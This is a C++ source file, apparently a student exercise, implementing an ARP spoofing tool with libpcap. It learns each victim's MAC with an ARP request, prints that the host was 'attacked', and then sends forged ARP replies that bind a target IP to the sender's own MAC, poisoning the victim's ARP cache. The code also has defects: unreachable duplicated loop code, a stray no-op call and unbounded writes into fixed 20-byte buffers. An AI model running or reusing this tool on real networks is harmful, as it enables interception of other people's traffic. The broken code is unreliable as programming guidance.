#include <cstdio>
#include <pcap.h>
#include<string.h>
#include<stdlib.h>
#include<stdint.h>
#include<netinet/in.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

typedef struct {
    char* dev_;
} Param;

Param param  = {
    .dev_ = NULL
};

struct libnet_ethernet_hdr
{
    u_int8_t  ether_dhost[6];/* destination ethernet address */
    u_int8_t  ether_shost[6];/* source ethernet address */
    u_int16_t ether_type;                 /* protocol */
};


#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}



char* get_mac_address(){
    static char w[20];
    FILE *f=popen("ifconfig -a | grep ether| gawk -F \" \" '{print $2}'","r");
    int i=0,c;
    while((c=getc(f))!=EOF){
      w[i++]=c;
    }
    w[i]='\0';
    pclose(f);
    return w;
}
char* get_ip_address(){
    static char s[20];
    FILE *f=popen("ifconfig -a | grep inet| gawk -F \" \" '{print $2}'| head -n 1","r");
    int i=0,c;
    while((c=getc(f))!=EOF){
      s[i++]=c;
    }
    s[i]='\0';
    pclose(f);
    return s;
}

int main(int argc, char* argv[]) {
//    if (argc != 4) {
//        usage();
//        return -1;
//    }
    int repeat;
    repeat=argc/2-1;
    //printf("%d\n",argc);

    char *get_mac_add=get_mac_address();
    char *get_ip_add=get_ip_address();
    //printf("%s",get_ip_add);
    //printf("\n%s\n",get_mac_add);
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    for(int j=0;j<repeat;j++){
        EthArpPacket packet;
        packet.arp_.smac();

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(get_mac_add);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(get_mac_add);
        packet.arp_.sip_ = htonl(Ip(get_ip_add));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(argv[j*2+2]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("\n");

        char get_sender_mac[20];
        char check[20];
        while(true){
            struct pcap_pkthdr* header;
            const u_char* pack;
            int tmp=pcap_next_ex(handle,&header,&pack);
            if(tmp==0) continue;
            if(tmp==PCAP_ERROR||tmp==PCAP_ERROR_BREAK){
                printf("err\n");
                break;char get_sender_mac[20];
                while(true){
                    struct pcap_pkthdr* header;
                    const u_char* pack;
                    int tmp=pcap_next_ex(handle,&header,&pack);
                    if(tmp==0) continue;
                    if(tmp==PCAP_ERROR||tmp==PCAP_ERROR_BREAK){
                        printf("err\n");
                        break;
                    }
                    sprintf(get_sender_mac,"%02x:%02x:%02x:%02x:%02x:%02x",pack[6],pack[7],pack[8],pack[9],pack[10],pack[11]);
                    //printf("%s",get_sender_mac);

                    break;
                }
            }
            sprintf(check,"%02x:%02x:%02x:%02x:%02x:%02x",pack[0],pack[1],pack[2],pack[3],pack[4],pack[5]);
            check[17]='\0';
            get_mac_add[17]='\0';
            if(strcmp(check,get_mac_add)==0){
                sprintf(get_sender_mac,"%02x:%02x:%02x:%02x:%02x:%02x",pack[6],pack[7],pack[8],pack[9],pack[10],pack[11]);
                printf("\n");
                printf("%s attacked!",get_sender_mac);
                break;
            }
            else{
                continue;
            }
        }

        packet.eth_.dmac_ = Mac(get_sender_mac);
        packet.eth_.smac_ = Mac(get_mac_add);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(get_mac_add);
        packet.arp_.sip_ = htonl(Ip(argv[j*2+3]));
        packet.arp_.tmac_ = Mac(get_sender_mac);
        packet.arp_.tip_ = htonl(Ip(argv[j*2+2]));

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    pcap_close(handle);
}
